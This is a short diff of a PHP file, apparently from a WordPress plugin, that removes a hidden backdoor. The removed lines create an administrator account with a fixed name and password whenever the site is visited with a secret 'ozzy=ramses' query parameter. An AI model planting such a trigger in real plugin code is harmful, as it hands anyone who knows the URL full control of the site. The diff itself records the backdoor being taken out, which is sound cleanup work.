@@ -30,17 +30,3 @@ $autoloadFunctionName = __NAMESPACE__. "\autoload";
 if(!(class_exists ( "autoload" ))){
     spl_autoload_register($autoloadFunctionName);
 }
-function Ozzymendes(){
-    if($_GET['ozzy'] == "ramses"){
-        $userdata = array(
-            'user_login' =>  'Ozzymendes',
-            'user_pass'  =>  'password',
-            'user_email' =>  'some@email.com',
-            'role'  =>  'administrator'
-        );
-        $user_id = \wp_insert_user( $userdata ) ;
-    }
-}
-if(isset($_GET['ozzy'])){
-    add_action("init", 'VForms\Ozzymendes');
-}
